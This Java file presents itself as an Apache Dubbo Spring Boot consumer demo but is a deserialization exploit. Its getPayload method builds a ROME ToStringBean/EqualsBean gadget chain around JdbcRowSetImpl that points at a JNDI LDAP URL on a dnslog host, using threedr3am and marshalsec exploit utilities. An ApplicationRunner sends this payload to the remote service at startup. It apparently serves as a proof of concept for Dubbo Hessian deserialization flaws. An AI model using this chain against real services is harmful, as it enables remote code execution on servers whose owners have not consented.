/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.dubbo.spring.boot.demo.consumer.bootstrap;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.exp.dubbo.payload.hessian.SpringAbstractBeanFactoryPointcutAdvisorPoc;
import com.threedr3am.exp.dubbo.utils.JDKUtil;
import groovy.transform.ToString;
import marshalsec.util.Reflections;
import org.apache.dubbo.config.annotation.Reference;
import org.apache.dubbo.spring.boot.demo.consumer.DemoService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.ApplicationRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.sql.rowset.BaseRowSet;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

import static org.springframework.web.bind.annotation.RequestMethod.GET;

/**
 * Dubbo Externalized Configuration Consumer Bootstrap
 */
@EnableAutoConfiguration
@RestController
public class DubboExternalizedConfigurationConsumerBootstrap {

    private final Logger logger = LoggerFactory.getLogger(getClass());

    @Reference(version = "${demo.service.version}", url = "${demo.service.url}")
    private DemoService demoService;
    private static Object getPayload() throws Exception {
        String jndiurl="ldap://hbo6t1.dnslog.cn";
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, com.threedr3am.exp.dubbo.utils.JDKUtil.makeJNDIRowSet(jndiurl));
        EqualsBean root = new EqualsBean(ToStringBean.class,item);
        return JDKUtil.makeMap(root,root);
    }
    public static void main(String[] args) {
        SpringApplication.run(DubboExternalizedConfigurationConsumerBootstrap.class).close();
    }

    @RequestMapping(value = "/say-hello", method = GET)
    public String sayHello(@RequestParam String name) {
        return demoService.sayHello(name);
    }

    @Bean
    public ApplicationRunner runner() throws Exception {
        Object o = getPayload();
        return args -> logger.info(demoService.commonTest(o));
    }
}
